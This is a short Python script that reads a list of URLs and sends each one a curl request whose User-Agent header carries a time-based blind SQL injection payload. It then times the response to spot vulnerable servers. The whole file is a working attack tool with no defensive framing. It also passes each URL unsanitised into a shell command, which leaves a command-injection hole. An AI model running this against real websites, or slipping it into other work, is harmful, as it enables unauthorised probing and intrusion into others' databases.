#!/bin/env python3
import subprocess
import sys
import time
from termcolor import colored

if len(sys.argv) < 2:
    print("Usage: python script.py filename")
    sys.exit()

filename = sys.argv[1]
command = 'curl -s -H "User-Agent: \'SELECT*FROM(SELECT IF(1=1,BINARY SLEEP(20),false))a;\'" --url "{}"'

with open(filename, "r") as f:
    urls = f.read().splitlines()

for i, url in enumerate(urls):
    start_time = time.time()
    subprocess.call(command.format(url), shell=True)
    end_time = time.time()
    duration = end_time - start_time
    print(colored("Request #{} to {} took {:.2f} seconds".format(i+1, url, duration), 'green'))
    print(colored("-" * 40, 'yellow'))
